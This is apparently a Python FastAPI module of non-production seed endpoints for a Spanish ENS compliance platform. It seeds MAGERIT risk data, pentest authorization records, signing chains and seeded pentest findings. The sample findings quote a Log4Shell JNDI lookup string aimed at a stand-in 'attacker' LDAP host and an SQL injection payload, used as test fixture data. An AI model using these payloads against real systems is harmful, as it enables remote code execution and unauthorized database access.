    ("AS-008", "I.8",  "A", 100, 40, 40, 0, 40),
]


@router.post(
    "/seed-magerit-alta-data",
    response_model=SeedMageritAltaResponse,
)
async def seed_magerit_alta_data(
    key: str | None = Query(
        default=None,
        description="Cliente dedicado por tier (mismo key que seed-dda-alta-project)",
    ),
    db: AsyncSession = Depends(get_db),
) -> SeedMageritAltaResponse:
    """Seed MAGERIT data E2E · 8 assets + 12 risks + threat catalog · idempotent.

    Requires `seed-dda-alta-project` invocado previamente (reusa test project +
    cliente). Si MAGERIT analysis ya tiene >=8 assets · idempotent skip.
    El parámetro ``key`` opera sobre el CLIENTE DEDICADO del tier (aislamiento).

    Flow:
    1. Get test client + project (debe existir via seed-dda-alta-project)
    2. Seed magerit_threats catalog (10 codes) si vacio
    3. Get/create MageritAnalysis para project (1.0)
    4. Create 8 MageritAsset (idempotent por code unique en analysis)
    5. Create 12 MageritThreatAssessment (idempotent por asset+threat_code)
    """
    _require_non_production()

    await db.execute(text("SET LOCAL ROLE fulkro_app_bypassrls"))

    cif, _ue, project_nombre, _cn = _resolve_test_identity(key)
    test_client = (
        await db.execute(select(Client).where(Client.cif == cif))
    ).scalar_one_or_none()
    if test_client is None:
        raise HTTPException(
            status_code=400,
            detail="Test client no existe · llamar primero seed-dda-alta-project",
        )

    test_project = (await db.execute(
        select(Project).where(
            Project.client_id == test_client.id,
            Project.nombre == project_nombre,
        )
    )).scalar_one_or_none()
    if test_project is None:
        raise HTTPException(
            status_code=400,
            detail="Test project no existe · llamar primero seed-dda-alta-project",
        )

    # 1. Threat catalog seed (idempotent · code UNIQUE)
    existing_threats = (await db.execute(
        select(MageritThreat.code).where(
            MageritThreat.code.in_([t["code"] for t in _THREAT_CATALOG_SEED])
        )
    )).scalars().all()
    existing_threat_codes = set(existing_threats)
    for tdata in _THREAT_CATALOG_SEED:
        if tdata["code"] in existing_threat_codes:
            continue
        db.add(MageritThreat(
            code=tdata["code"],
            name=tdata["name"],
            group_code=tdata["group_code"],
            description=tdata["description"],
            affected_dimensions=tdata["affected_dimensions"],
        ))
    await db.flush()

    # 2. Set tenant context para MAGERIT RLS si aplica
    await set_tenant_context(
        db, client_id=test_client.id, project_id=test_project.id,
    )

    # 3. Get/create MageritAnalysis (active)
    analysis = (await db.execute(
        select(MageritAnalysis)
        .where(MageritAnalysis.project_id == test_project.id)
        .where(MageritAnalysis.deleted_at.is_(None))
        .order_by(MageritAnalysis.created_at.desc())
        .limit(1)
    )).scalar_one_or_none()

    if analysis is None:
        analysis = MageritAnalysis(
            project_id=test_project.id,
            name="AR-2026-E2E",
            version=1,
            status="completed",
            calculation_mode="qualitative",
        )
        db.add(analysis)
        await db.flush()

    # 4. Idempotency check · assets
    existing_assets_count = (await db.execute(
        select(text("count(*)"))
        .select_from(MageritAsset)
        .where(MageritAsset.analysis_id == analysis.id)
        .where(MageritAsset.deleted_at.is_(None))
    )).scalar_one()

    if existing_assets_count and existing_assets_count >= 8:
        risks_count = (await db.execute(
            select(text("count(*)"))
            .select_from(MageritThreatAssessment)
            .where(MageritThreatAssessment.analysis_id == analysis.id)
        )).scalar_one()
        await db.commit()
        return SeedMageritAltaResponse(
            project_id=str(test_project.id),
            client_id=str(test_client.id),
            analysis_id=str(analysis.id),
            assets_count=int(existing_assets_count),
            risks_count=int(risks_count or 0),
            note="MAGERIT already seeded · idempotent skip",
        )

    # 5. Create 8 assets
    assets_by_code: dict[str, MageritAsset] = {}
    for code, name, type_code, desc, vd, vi, vc, va, vt in _ASSETS_SEED:
        asset = MageritAsset(
            analysis_id=analysis.id,
            code=code,
            name=name,
            asset_type_code=type_code,
            description=desc,
            owner="E2E Test Owner",
            value_d=vd, value_i=vi, value_c=vc, value_a=va, value_t=vt,
        )
        db.add(asset)
        await db.flush()
        assets_by_code[code] = asset

    # 6. Create 12 threat assessments
    for asset_code, t_code, prob, dd, di, dc, da, dt in _RISKS_SEED:
        asset = assets_by_code[asset_code]
        assessment = MageritThreatAssessment(
            analysis_id=analysis.id,
            asset_id=asset.id,
            threat_code=t_code,
            probability=prob,
            degradation_d=dd,
            degradation_i=di,
            degradation_c=dc,
            degradation_a=da,
            degradation_t=dt,
        )
        db.add(assessment)
    await db.flush()

    risks_total = (await db.execute(
        select(text("count(*)"))
        .select_from(MageritThreatAssessment)
        .where(MageritThreatAssessment.analysis_id == analysis.id)
    )).scalar_one()

    await db.commit()
    return SeedMageritAltaResponse(
        project_id=str(test_project.id),
        client_id=str(test_client.id),
        analysis_id=str(analysis.id),
        assets_count=len(_ASSETS_SEED),
        risks_count=int(risks_total or 0),
        note="MAGERIT seeded · 8 assets + 12 risks · cliente E2E review only",
    )


# ════════════════════════════════════════════════════════════════════
# SAN-E v3.MB-5.5.D · Seed pentest authorization E2E data
# ════════════════════════════════════════════════════════════════════


class SeedPentestAuthResponse(BaseModel):
    project_id: str
    client_id: str
    verification_run_id: str
    note: str


@router.post(
    "/seed-pentest-auth-data",
    response_model=SeedPentestAuthResponse,
)
async def seed_pentest_auth_data(
    key: str | None = Query(
        default=None,
        description="Cliente dedicado por tier (mismo key que seed-dda-alta-project)",
    ),
    db: AsyncSession = Depends(get_db),
) -> SeedPentestAuthResponse:
    """Seed pentest authorization E2E · VerificationRun realistic data · idempotent.

    Requires seed-dda-alta-project invocado previamente (reusa test project +
    cliente). Si VerificationRun ya existe con authorization_signed_at NOT NULL
    · idempotent skip. El parámetro ``key`` opera sobre el CLIENTE DEDICADO.

    Datos seed:
    - Scope: 2 targets staging + 3 exclusions + credentials_provided=True
    - Ventana: 1-7 junio 2026 · business hours only · Europe/Madrid
    - Plan: medium intensity · 40h · 5 tools (Nuclei · Burp · Nmap · sqlmap · ZAP)
    - IR: Marcos Mata 24/7
    - RoE + disclosure + data handling policies
    - authorization_signed_at NOT NULL (admin firma pre-cliente review)
    - client_reviewed_at NULL (cliente E2E pendiente)
    """
    from datetime import UTC, datetime, timedelta

    _require_non_production()

    await db.execute(text("SET LOCAL ROLE fulkro_app_bypassrls"))

    cif, _ue, project_nombre, _cn = _resolve_test_identity(key)
    test_client = (
        await db.execute(select(Client).where(Client.cif == cif))
    ).scalar_one_or_none()
    if test_client is None:
        raise HTTPException(
            status_code=400,
            detail="Test client no existe · llamar primero seed-dda-alta-project",
        )

    test_project = (await db.execute(
        select(Project).where(
            Project.client_id == test_client.id,
            Project.nombre == project_nombre,
        )
    )).scalar_one_or_none()
    if test_project is None:
        raise HTTPException(
            status_code=400,
            detail="Test project no existe · llamar primero seed-dda-alta-project",
        )

    scope_jsonb = {
        "summary": "Pentest aplicacion SaaS · scope completo + API",
        "targets": [
            {"target_url": "https://staging.cliente.com", "target_type": "web_app"},
            {"target_url": "https://api.staging.cliente.com", "target_type": "api"},
        ],
        "exclusions": [
            "DDoS attacks",
            "Social engineering staff",
            "Physical access",
        ],
        "credentials_provided": True,
        "data_classification": "staging",
    }

    tools_config = {
        "tools": ["Nuclei", "Burp Suite", "Nmap", "sqlmap", "ZAP"],
    }

    ventana_inicio = datetime(2026, 6, 1, 9, 0, tzinfo=UTC)
    ventana_fin = datetime(2026, 6, 7, 18, 0, tzinfo=UTC)
    admin_signed_at = datetime.now(UTC) - timedelta(hours=2)

    # Idempotency · si existe VerificationRun para el project · reuse
    existing = (await db.execute(
        select(VerificationRun)
        .where(VerificationRun.project_id == test_project.id)
        .where(VerificationRun.deleted_at.is_(None))
        .order_by(VerificationRun.created_at.desc())
        .limit(1)
    )).scalar_one_or_none()

    # NOTA auditoría 2026-06-07: ANTES había aquí un short-circuit que retornaba
    # si authorization_signed_at != None, SIN resetear el estado de revisión/firma
    # del cliente → en re-runs el pentest quedaba "ya revisado/firmado" y el E2E
    # no podía volver a revisar/firmar (timeout fill). Eliminado: ahora SIEMPRE
    # cae al reset cliente (client_reviewed_at=None, etc.) + borrado de firmas
    # pentest previas más abajo (idempotencia cross-run real).

    if existing is None:
        run = VerificationRun(
            project_id=test_project.id,
            category="MEDIO",
            mode="internal",
            status="pending",
            scope_jsonb=scope_jsonb,
            tools_config=tools_config,
            scheduled_start=ventana_inicio,
            authorized_by="marcos",
            authorization_signed_at=admin_signed_at,
            created_by="marcos",
        )
    else:
        run = existing
        run.scope_jsonb = scope_jsonb
        run.tools_config = tools_config
        run.scheduled_start = ventana_inicio
        run.authorized_by = "marcos"
        run.authorization_signed_at = admin_signed_at

    # NEW migration fc8ad935f6f6 columns
    run.ventana_fin = ventana_fin
    run.ventana_timezone = "Europe/Madrid"
    run.ventana_business_hours_only = True
    run.plan_test_categorias = ["osint", "scan", "web_app", "api"]
    run.plan_test_intensity = "medium"
    run.plan_test_estimated_hours = 40
    run.contacto_ir_nombre = "Marcos Mata"
    run.contacto_ir_email = "marcos@fulkro.com"
    run.contacto_ir_telefono = "+34 6XX XXX XXX"
    run.contacto_ir_horario = "09:00-18:00 CEST · 24/7 emergencias"
    run.rules_of_engagement = (
        "Solo testing dentro de ventana autorizada. "
        "Pausar inmediato si encuentra PII real o servicios productivos. "
        "Reportar criticos inmediato a contacto IR."
    )
    run.responsibility_disclosure = (
        "Vulnerabilidades CRITICAS reportadas inmediato (mismo dia). "
        "Resto en informe final post-pentest. "
        "Confidencialidad estricta · sin disclosure publico sin acuerdo."
    )
    run.data_handling_policy = (
        "Logs cifrados Hetzner EU. Tooling outputs in-memory donde posible. "
        "Destruccion completa 30 dias post-certificacion. "
        "Backups encriptados S3 EU-only."
    )
    # cliente review pending (E2E test markeara)
    run.client_reviewed_at = None
    run.client_reviewed_by_user_id = None
    run.client_concerns_note = None
    run.client_signing_intent_id = None

    if existing is None:
        db.add(run)
    await db.flush()

    # Borrar firmas pentest previas para que el cliente pueda volver a firmar en
    # re-runs (gate firma abierto · idempotencia cross-run). Solo pentest_auth
    # (no rompe firmas de otros flujos · cada test re-siembra su cadena).
    # Sin session_replication_role (cirugía rol · bypassrls NOSUPERUSER): no hace
    # falta · signing_events sin triggers, FK CASCADE. Borramos events del intent
    # pentest y luego el intent (CASCADE limpia lo enlazado restante).
    await db.execute(
        text(
            "DELETE FROM signing_events WHERE signing_intent_id IN "
            "(SELECT id FROM signing_intents WHERE project_id = :pid "
            "AND signable_type = 'pentest_authorization')"
        ),
        {"pid": str(test_project.id)},
    )
    await db.execute(
        text(
            "DELETE FROM signing_intents WHERE project_id = :pid "
            "AND signable_type = 'pentest_authorization'"
        ),
        {"pid": str(test_project.id)},
    )
    await db.commit()

    return SeedPentestAuthResponse(
        project_id=str(test_project.id),
        client_id=str(test_client.id),
        verification_run_id=str(run.id),
        note="Pentest authorization seeded · scope+ventana+plan+IR+RoE · cliente E2E pending",
    )


# ════════════════════════════════════════════════════════════════════
# SAN-E v3.MB-5.6.E · Seed conformidad ENS ready data
# ════════════════════════════════════════════════════════════════════


class SeedConformidadReadyResponse(BaseModel):
    project_id: str
    client_id: str
    declaration_id: str
    tier: str
    chain_signed: dict
    evidence_count: int
    policies_signed_count: int
    note: str


def _make_signing_intent(
    project_id: uuid.UUID,
    signable_type: str,
    user_id: uuid.UUID,
) -> SigningIntent:
    from datetime import UTC, datetime as _dt, timedelta
    return SigningIntent(
        id=uuid.uuid4(),
        project_id=project_id,
        signable_type=signable_type,
        document_hash_sha256="0" * 64,
        intent_payload={"e2e_seed": True},
        status="signed",
        requires_step_up_otp=True,
        expires_at=_dt.now(UTC) + timedelta(days=1),
        created_by_user_id=user_id,
    )


def _make_signing_event(
    project_id: uuid.UUID,
    intent_id: uuid.UUID,
    event_hash: str,
) -> SigningEvent:
    return SigningEvent(
        id=uuid.uuid4(),
        project_id=project_id,
        signing_intent_id=intent_id,
        event_type="signature_generated",
        actor_type="client_user",
        event_payload={"e2e_seed": True},
        event_hash_sha256=event_hash,
    )


@router.post(
    "/seed-conformidad-ready",
    response_model=SeedConformidadReadyResponse,
)
async def seed_conformidad_ready_data(
    tier: str = Query("BASICA", description="BASICA | MEDIA | ALTA"),
    key: str | None = Query(
        default=None,
        description=(
            "Tarea C · si se indica, opera sobre el CLIENT DEDICADO aislado "
            "(mismo `key` que seed-dda-alta-project) para que R27 LIMIT 1 "
            "resuelva el proyecto del tier correcto. Omitir = legacy compartido."
        ),
    ),
    db: AsyncSession = Depends(get_db),
) -> SeedConformidadReadyResponse:
    """Seed conformidad ready data E2E · chain firmas + evidencias + draft tier-aware.

    Requires seed-dda-alta-project invocado primero (reusa test project + cliente).
    Idempotent: si chain firmas existing · solo crea/actualiza draft declaration.

    Seeds:
    - DdA + MAGERIT + Pentest signing_events (signature_generated)
    - Evidence rows segun tier (BASICA 25 / MEDIA 50 / ALTA 73)
    - Policies firmadas (ALTA only · 8 policy_approval signing_events)
    - BasicDeclarationRow draft tier-aware:
      * BASICA → declaration_type=initial
      * MEDIA/ALTA → declaration_type=commitment_pre_certification
    - Sets project.categoria_objetivo = tier
    """
    _require_non_production()

    if tier not in ("BASICA", "MEDIA", "ALTA"):
        raise HTTPException(400, f"Invalid tier {tier} · use BASICA/MEDIA/ALTA")

    cif, _user_email, project_nombre, _client_nombre = _resolve_test_identity(key)

    await db.execute(text("SET LOCAL ROLE fulkro_app_bypassrls"))

    test_client = (
        await db.execute(select(Client).where(Client.cif == cif))
    ).scalar_one_or_none()
    if test_client is None:
        raise HTTPException(
            400,
            "Test client no existe · llamar primero seed-dda-alta-project"
            + (f" (key={key})" if key else ""),
        )

    test_project = (await db.execute(
        select(Project).where(
            Project.client_id == test_client.id,
            Project.nombre == project_nombre,
        )
    )).scalar_one_or_none()
    if test_project is None:
        raise HTTPException(
            400,
            "Test project no existe · llamar primero seed-dda-alta-project",
        )

    # Set tier en project
    test_project.categoria_objetivo = tier

    # Idempotencia E2E DEFINITIVA: limpiar el estado de ciclo del proyecto ANTES
    # de sembrar (pollution cross-spec/cross-run) → estado determinista del tier.
    # Cirugía de rol (2026-06-07): corre como fulkro_app_bypassrls (NOSUPERUSER),
    # sin session_replication_role. No hace falta: BYPASSRLS ve todas las filas;
    # los FK a signing_intents son CASCADE/SET NULL; las únicas triggers (audit
    # en evidence/documents · fn_audit_track) sólo registran, no bloquean. Orden
    # de borrado seguro + begin_nested por tabla (tolera tabla sin project_id).
    await db.execute(
        text("DELETE FROM signing_events WHERE project_id = :pid"),
        {"pid": str(test_project.id)},
    )
    for _reset_tbl in (
        "signing_intents", "basic_declarations", "documents", "evidence",
        "conformity_submissions", "conformity_state_snapshots", "conformity_routes",
    ):
        try:
            async with db.begin_nested():
                await db.execute(
                    text(f"DELETE FROM {_reset_tbl} WHERE project_id = :pid"),
                    {"pid": str(test_project.id)},
                )
        except Exception:  # noqa: BLE001 · tabla sin project_id → skip
            pass
    await db.flush()

    # Chain firmas previas (idempotent · solo crea si missing)
    chain_signed: dict[str, str] = {}
    seed_user_id = uuid.uuid4()
    for signable_type in ("dda", "magerit_validation", "pentest_authorization"):
        existing_intent = (await db.execute(
            select(SigningIntent).where(
                SigningIntent.project_id == test_project.id,
                SigningIntent.signable_type == signable_type,
            ).limit(1)
        )).scalar_one_or_none()

        if existing_intent is None:
            intent = _make_signing_intent(
                test_project.id, signable_type, seed_user_id,
            )
            db.add(intent)
            await db.flush()
            event = _make_signing_event(
                test_project.id, intent.id,
                f"{signable_type[:8]:0<8}".ljust(64, "f"),
            )
            db.add(event)
            await db.flush()
            chain_signed[signable_type] = "seeded"
        else:
            existing_event = (await db.execute(
                select(SigningEvent).where(
                    SigningEvent.signing_intent_id == existing_intent.id,
                    SigningEvent.event_type == "signature_generated",
                ).limit(1)
            )).scalar_one_or_none()
            if existing_event is None:
                event = _make_signing_event(
                    test_project.id, existing_intent.id,
                    f"{signable_type[:8]:0<8}".ljust(64, "f"),
                )
                db.add(event)
                await db.flush()
            chain_signed[signable_type] = "already_seeded"

    # Evidence count target per tier
    target_evidence: int = {"BASICA": 25, "MEDIA": 50, "ALTA": 73}[tier]
    current_evidence = (await db.execute(
        select(text("count(*)"))
        .select_from(Evidence)
        .where(Evidence.project_id == test_project.id)
        .where(Evidence.vigente.is_(True))
        .where(Evidence.deleted_at.is_(None))
    )).scalar() or 0

    if current_evidence < target_evidence:
        for _ in range(target_evidence - current_evidence):
            db.add(Evidence(
                id=uuid.uuid4(),
                project_id=test_project.id,
                tipo="document",
                vigente=True,
            ))
        await db.flush()

    # Policies firmadas · readiness cuenta DOCUMENTS linkados a un signing_intent
    # policy_approval status='signed' (modelo bulk Q1.C · _count_signed_policies).
    # Antes el seed solo creaba intents (ALTA·8) → conteo=0 → blocker en los 3
    # tiers (verificación adversarial). Ahora siembra _TIER_MIN_POLICIES docs
    # linkados por tier (BASICA 10 / MEDIA 18 / ALTA 25) · SINGLE SOURCE OF TRUTH
    # importado del readiness_service para que NO vuelva a desincronizarse.
    from backend.app.motors.m27_conformity.readiness_service import (
        _TIER_MIN_POLICIES,
    )
    min_policies = _TIER_MIN_POLICIES.get(tier, 0)
    policies_count = int((await db.execute(
        text(
            "SELECT count(*) FROM documents d "
            "JOIN signing_intents si ON si.id = d.client_signing_intent_id "
            "WHERE d.project_id = :pid AND si.signable_type = 'policy_approval' "
            "AND si.status = 'signed' AND d.deleted_at IS NULL"
        ),
        {"pid": str(test_project.id)},
    )).scalar() or 0)
    if policies_count < min_policies:
        bulk_intent_id = (await db.execute(
            select(SigningIntent.id).where(
                SigningIntent.project_id == test_project.id,
                SigningIntent.signable_type == "policy_approval",
                SigningIntent.status == "signed",
            ).limit(1)
        )).scalar_one_or_none()
        if bulk_intent_id is None:
            bulk_intent = _make_signing_intent(
                test_project.id, "policy_approval", seed_user_id,
            )
            db.add(bulk_intent)
            await db.flush()
            db.add(_make_signing_event(
                test_project.id, bulk_intent.id, "policybulk".ljust(64, "f"),
            ))
            await db.flush()
            bulk_intent_id = bulk_intent.id
        for i in range(policies_count, min_policies):
            await db.execute(
                text(
                    "INSERT INTO documents ("
                    "id, project_id, nombre, tipo, clasificacion, "
                    "content_hash, file_size_bytes, storage_path, estado, "
                    "version_actual, client_signing_intent_id, "
                    "created_at, updated_at"
                    ") VALUES ("
                    ":id, :pid, :nombre, :tipo, :clasif, "
                    ":hash, :size, :spath, :estado, "
                    ":ver, :csi, NOW(), NOW())"
                ),
                {
                    "id": str(uuid.uuid4()),
                    "pid": str(test_project.id),
                    "nombre": f"Politica ENS {i + 1:02d}",
                    "tipo": "application/pdf",
                    "clasif": "evidencia",
                    "hash": f"pol{i:0<6}".ljust(64, "0"),
                    "size": 1024,
                    "spath": f"minio://fulkro-documents/seed/policy-{test_project.id}-{i}",
                    "estado": "draft",
                    "ver": "1.0",
                    "csi": str(bulk_intent_id),
                },
            )
        await db.flush()
        policies_count = min_policies

    # BasicDeclarationRow draft tier-aware
    decl_type = "initial" if tier == "BASICA" else "commitment_pre_certification"
    # Idempotencia E2E robusta: resetea TODAS las declaraciones del proyecto a
    # estado SIN firmar (pollution multi-fila de runs previos · la API puede
    # devolver cualquiera). FK-safe (UPDATE, no DELETE).
    await db.execute(
        text(
            "UPDATE basic_declarations SET signed_at = NULL, "
            "client_reviewed_at = NULL, status = 'pending_client_signature' "
            "WHERE project_id = :pid"
        ),
        {"pid": str(test_project.id)},
    )
    existing_decl = (await db.execute(
        select(BasicDeclarationRow)
        .where(BasicDeclarationRow.project_id == test_project.id)
        .where(BasicDeclarationRow.declaration_type.in_(
            ("initial", "commitment_pre_certification")
        ))
        .order_by(BasicDeclarationRow.created_at.desc())
        .limit(1)
    )).scalar_one_or_none()

    if existing_decl is None or existing_decl.declaration_type != decl_type:
        decl = BasicDeclarationRow(
            id=uuid.uuid4(),
            project_id=test_project.id,
            declaration_type=decl_type,
            responsible_person_name="Marcos Mata",
            responsible_person_email="marcosmata@fulkro.es",
            status="pending_client_signature",
        )
        db.add(decl)
        await db.flush()
    else:
        decl = existing_decl
        # Idempotencia E2E: resetear a estado fresco SIN firmar para que el
        # cliente pueda volver a firmar. Un run previo pudo dejarla firmada
        # (signed_at NOT NULL) → la página muestra PostSignSection (ya conforme)
        # → sin botón de firma → la spec no podría re-ejecutar el flujo.
        decl.signed_at = None
        decl.client_reviewed_at = None
        decl.status = "pending_client_signature"
        await db.flush()

    await db.commit()

    return SeedConformidadReadyResponse(
        project_id=str(test_project.id),
        client_id=str(test_client.id),
        declaration_id=str(decl.id),
        tier=tier,
        chain_signed=chain_signed,
        evidence_count=target_evidence,
        policies_signed_count=policies_count,
        note=(
            f"Conformidad {tier} ready · chain firmas + {target_evidence} evidencias"
            + (f" + {policies_count} policies" if tier == "ALTA" else "")
            + f" · declaration_type={decl_type}"
        ),
    )


# ════════════════════════════════════════════════════════════════════
# Sim full-cloth · IMPLANTACIÓN ENS COMPLETA por tier (BÁSICA/MEDIA/ALTA)
# ════════════════════════════════════════════════════════════════════
class SeedFullImplantationResponse(BaseModel):
    tier: str
    project_id: str
    client_id: str
    dda_aplicables: int
    evidence_count: int
    magerit_assets: int
    conformity_route_state: str
    distintivo_document_id: str | None
    e040_cumplimiento_global: float | None
    pentest_findings: int = 0
    extras_errors: list[str]
    note: str


def _alta_pentest_candidates() -> list[dict]:
    """Hallazgos realistas de un pentest ENS ALTO (el autopilot de Fulkro los
    descubriría vía el arsenal MCP en Hetzner con USE_MCP_REAL). Cubren familias
    Anexo II op.exp / op.acc / mp.com / mp.sw / mp.s vía el EnsMapper determinista
    (Capa 1 CVE→ENS + Capa 1b patrón→ENS · sin LLM). Mezcla de severidades real."""
    return [
        {  # Log4Shell RCE — high+EPSS escala a critical → op.exp.5, op.exp.6
            "title": "Apache Log4j2 RCE (Log4Shell)",
            "description": "JNDI lookup remote code execution en log4j-core expuesto",
            "severity": "high", "cve_id": "CVE-2021-44228",
            "affected_host": "10.20.0.10", "affected_port": 8080,
            "affected_service": "http",
            "tool": "vulnscan:nuclei_scan", "source_engine": "vulnscan:nuclei_scan",
            "rule_id": "CVE-2021-44228",
            "raw_output_excerpt": "matched ${jndi:ldap://attacker/x}",
        },
        {  # regreSSHion — high → op.exp.4, op.acc.6
            "title": "OpenSSH regreSSHion RCE pre-auth",
            "description": "Race condition en sshd permite RCE pre-auth (CVE-2024-6387)",
            "severity": "high", "cve_id": "CVE-2024-6387",
            "affected_host": "vpn.cliente-alta.es", "affected_port": 22,
            "affected_service": "ssh",
            "tool": "vulnscan:openvas_scan", "source_engine": "vulnscan:openvas_scan",
            "rule_id": "CVE-2024-6387",
            "raw_output_excerpt": "OpenSSH 8.5p1 vulnerable a regreSSHion",
        },
        {  # TLS débil → mp.com.2, mp.com.3
            "title": "Configuracion TLS debil (TLS 1.0 / RC4)",
            "description": "El servidor acepta TLS 1.0 y cifradores RC4 (weak cipher)",
            "severity": "medium",
            "affected_host": "portal.cliente-alta.es", "affected_port": 443,
            "affected_service": "https",
            "tool": "webpentest:testssl", "source_engine": "webpentest:testssl",
            "rule_id": "testssl-weak-tls",
            "raw_output_excerpt": "TLS 1.0 offered, RC4 ciphers present",
        },
        {  # SQLi → mp.sw.1, op.exp.5
            "title": "SQL Injection en formulario de login",
            "description": "Parametro 'usuario' vulnerable a blind SQL Injection",
            "severity": "high",
            "affected_host": "portal.cliente-alta.es",
            "affected_url": "https://portal.cliente-alta.es/login",
            "affected_service": "https",
            "tool": "webpentest:zap", "source_engine": "webpentest:zap",
            "rule_id": "zap-sqli-40018",
            "raw_output_excerpt": "blind SQL Injection confirmado: ' OR 1=1--",
        },
        {  # Cabeceras seguridad ausentes → mp.s.2
            "title": "Cabeceras de seguridad HTTP ausentes",
            "description": "Faltan Content-Security-Policy y Strict-Transport-Security",
            "severity": "low",
            "affected_host": "api.cliente-alta.es", "affected_port": 443,
            "affected_service": "https",
            "tool": "vulnscan:nuclei_scan", "source_engine": "vulnscan:nuclei_scan",
            "rule_id": "http-missing-security-headers",
            "raw_output_excerpt": "Content-Security-Policy missing; Strict-Transport-Security missing",
        },
        {  # SSH PermitRootLogin → op.acc.6, op.exp.3
            "title": "SSH PermitRootLogin habilitado",
            "description": "sshd_config permite PermitRootLogin yes (hardening CCN-STIC 619)",
            "severity": "medium",
            "affected_host": "10.20.0.11", "affected_port": 22,
            "affected_service": "ssh",
            "tool": "config:lynis_audit", "source_engine": "config:lynis_audit",
            "rule_id": "SSH-7408",
            "raw_output_excerpt": "PermitRootLogin yes detectado en sshd_config",
        },
        {  # Credenciales por defecto → op.acc.5, op.acc.4
            "title": "Credenciales por defecto en panel admin",
            "description": "Panel admin accesible con default credentials admin/admin",
            "severity": "high",
            "affected_host": "10.20.0.10", "affected_port": 8443,
            "affected_service": "https",
            "tool": "vulnscan:nuclei_scan", "source_engine": "vulnscan:nuclei_scan",
            "rule_id": "default-credentials",
            "raw_output_excerpt": "default credentials admin/admin aceptadas (HTTP 200)",
        },
    ]


@router.post(
    "/seed-full-implantation", response_model=SeedFullImplantationResponse
)
async def seed_full_implantation(
    tier: str = Query(..., description="BASICA | MEDIA | ALTA"),
    key: str | None = Query(
        default=None,
        description=(
            "conformidad-basica | conformidad-media | conformidad-alta · "
            "omitir = cliente/proyecto de test compartido (default E2E)"
        ),
    ),
    db: AsyncSession = Depends(get_db),
) -> SeedFullImplantationResponse:
    """Implantación ENS COMPLETA, firmada y correcta para un cliente+proyecto
    DEDICADO por tier (BÁSICA 52 / MEDIA 68 / ALTA 73 medidas aplicables Anexo II
    RD 311/2022), persistida en la BD dev: DdA tier-correcta + freeze, MAGERIT,
    pentest (ALTA), evidencias + políticas + firmas, E-040, ruta de conformidad
    CONFORMANT, distintivo E-049 + cert externo (MEDIA/ALTA). Así el admin UI, el
    portal cliente y el portal auditor renderizan datos REALES y los entregables
    son correctos. Reusa los seeds keyed + la cadena de servicios de
    test_sim_media. Idempotente. Los pasos 'extra' van envueltos: si alguno falla
    se reporta en extras_errors sin abortar el núcleo.
    """
    _require_non_production()
    tier = tier.upper()
    if tier not in ("BASICA", "MEDIA", "ALTA"):
        raise HTTPException(400, "tier debe ser BASICA|MEDIA|ALTA")

    from backend.app.motors.m03_dda.enums import CategoriaSistema
    from backend.app.motors.m03_dda.service import DdaService

    RSEG = "Beatriz Seguridad López"
    extras_errors: list[str] = []
    pentest_findings = 0
    cif, user_email, project_nombre, client_nombre = _resolve_test_identity(key)

    # ── STEP 1 · cliente + usuario + proyecto dedicado (categoría = tier) ──
    await db.execute(text("SET LOCAL ROLE fulkro_app_bypassrls"))
    client = (
        await db.execute(select(Client).where(Client.cif == cif))
    ).scalar_one_or_none()
    if client is None:
        client = Client(id=uuid.uuid4(), nombre=client_nombre, cif=cif)
        db.add(client)
        await db.flush()
    user = (await db.execute(
        select(ClientUser).where(
            ClientUser.client_id == client.id, ClientUser.email == user_email,
        )
    )).scalar_one_or_none()
    if user is None:
        user = ClientUser(
            id=uuid.uuid4(), client_id=client.id, email=user_email,
            password_hash=hash_password(_TEST_USER_PASSWORD),
            full_name="Test E2E User", must_change_password=False,
        )
        db.add(user)
        await db.flush()
    project = (await db.execute(
        select(Project).where(
            Project.client_id == client.id, Project.nombre == project_nombre,
        )
    )).scalar_one_or_none()
    if project is None:
        project = Project(
            id=uuid.uuid4(), client_id=client.id, nombre=project_nombre,
            categoria_objetivo=tier, estado="active", lifecycle_state="ACTIVE",
        )
        db.add(project)
        await db.flush()
    else:
        project.categoria_objetivo = tier
        await db.flush()
    pid = project.id
    cid = client.id  # capturar valor: commits posteriores expiran el ORM obj
    await set_tenant_context(db, client_id=cid, project_id=pid)

    # ── STEP 3 · DdA TIER-CORRECTA + FREEZE ──
    existing = (await db.execute(text(
        "SELECT count(*) FROM dda_entries WHERE project_id=:p AND deleted_at IS NULL"
    ), {"p": str(pid)})).scalar()
    if int(existing or 0) < 70:
        await DdaService(db).generate_dda(
            pid, CategoriaSistema[tier], responsable=RSEG, enforce_gates=False,
        )
    await db.execute(text(
        "UPDATE dda_entries SET estado_implementacion='implantada', aprobado_por=:r, "
        "fecha_aprobacion=current_date WHERE project_id=:p AND aplicabilidad <> 'no_aplica'"
    ), {"r": RSEG, "p": str(pid)})
    await db.commit()

    # ── STEP 3b · firma E-040 DdA + acta de categorización E-012 ──
    # FIX(audit 2026-06-13): el seed dejaba la DdA SIN firma de proyecto
    # (dda_project_signatures vacío → el auditor la veía is_signed=False, Art.
    # 28.2) y SIN acta de categorización (categorizations=0). Se completan para
    # que el proyecto "100% implantado" sea genuinamente auditable.
    try:
        await db.execute(text("SET LOCAL ROLE fulkro_app_bypassrls"))
        await set_tenant_context(db, client_id=cid, project_id=pid)
        from datetime import date as _date
        from backend.app.models.ens import DdaProjectSignature
        from backend.app.models.core import System, Categorization
        if not (await db.execute(text(
            "SELECT 1 FROM dda_project_signatures WHERE project_id=:p"
        ), {"p": str(pid)})).first():
            db.add(DdaProjectSignature(project_id=pid, signature_magic_link_id=uuid.uuid4()))
        sysrow = (await db.execute(
            select(System).where(System.project_id == pid).limit(1)
        )).scalar_one_or_none()
        if sysrow is None:
            sysrow = System(id=uuid.uuid4(), project_id=pid,
                            nombre="Sistema de Información Corporativo")
            db.add(sysrow)
            await db.flush()
        if not (await db.execute(text(
            "SELECT 1 FROM categorizations WHERE system_id=:s"
        ), {"s": str(sysrow.id)})).first():
            db.add(Categorization(
                id=uuid.uuid4(), system_id=sysrow.id, categoria_resultante=tier,
                fecha_acta=_date.today(),
                aprobado_por=RSEG, version=1, signature_magic_link_id=uuid.uuid4(),
                input_snapshot={"regla": "maximo (Anexo I RD 311/2022)", "origen": "seed"},
            ))
        await db.commit()
    except Exception as exc:  # noqa: BLE001
        extras_errors.append(f"e040-categorizacion: {exc}")
        await db.rollback()

    # ── STEP 4 · MAGERIT (keyed) ──
    try:
        await seed_magerit_alta_data(key=key, db=db)
    except Exception as exc:  # noqa: BLE001
        extras_errors.append(f"magerit: {exc}")
        await db.rollback()

    # ── STEP 5 · pentest authorization (solo ALTA) ──
